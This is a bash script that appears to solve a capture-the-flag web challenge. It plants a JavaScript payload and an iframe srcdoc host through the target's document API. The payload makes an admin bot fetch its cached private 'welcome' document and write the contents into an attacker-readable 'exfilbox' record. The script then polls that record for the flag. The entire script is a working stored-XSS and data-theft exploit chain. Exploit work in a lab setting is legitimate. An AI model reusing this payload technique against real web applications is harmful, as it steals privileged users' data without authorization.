#!/usr/bin/env bash
set -euo pipefail
U="${1:-https://dont-worry-f72527062eeb.chall.nnsc.tf}"

JS='(async()=>{const w=async v=>{try{const r=await fetch("/api/documents/welcome?key=k&view="+v,{cache:"force-cache"});if(!r.ok)return null;const d=await r.json();return d&&d.body?d.body:null}catch(e){return null}};let b=await w("editor");if(!b)b=await w("reader");await fetch("/api/documents/exfilbox?key=exfilkey123",{method:"PUT",headers:{"content-type":"application/json"},body:JSON.stringify({title:"flag",body:b||"MISS",language:"none"})})})();'

HOST='<iframe srcdoc='"'"'<script src="/raw/payloadreal?key=pkey123"></script>'"'"'></iframe>'

put(){ curl -sk -X PUT "$U/api/documents/$1?key=$2" -H "content-type: application/json" --data-binary "$3"; echo " <= $1"; }

put exfilbox    exfilkey123 "$(jq -nc --arg b ''      '{title:"box",body:$b,language:"none"}')"
put payloadreal pkey123     "$(jq -nc --arg b "$JS"   '{title:"p",body:$b,language:"javascript"}')"
put hostreal    hkey123     "$(jq -nc --arg b "$HOST" '{title:"h",body:$b,language:"none"}')"

echo
echo ">>> Submit this to the Admin bot 'url' box:"
echo "    /d/hostreal#hkey123"
echo
echo ">>> Polling exfilbox for the flag (Ctrl-C to stop)..."
for i in $(seq 1 40); do
  body=$(curl -sk "$U/api/documents/exfilbox?key=exfilkey123&view=reader" | jq -r '.body // ""')
  if [ -n "$body" ] && [ "$body" != "MISS" ]; then echo "FLAG: $body"; exit 0; fi
  [ "$body" = "MISS" ] && echo "[$i] bot ran but cache MISS — resubmit the bot"
  sleep 6
done
echo "timed out; re-run the bot and: curl -sk \"$U/api/documents/exfilbox?key=exfilkey123&view=reader\""
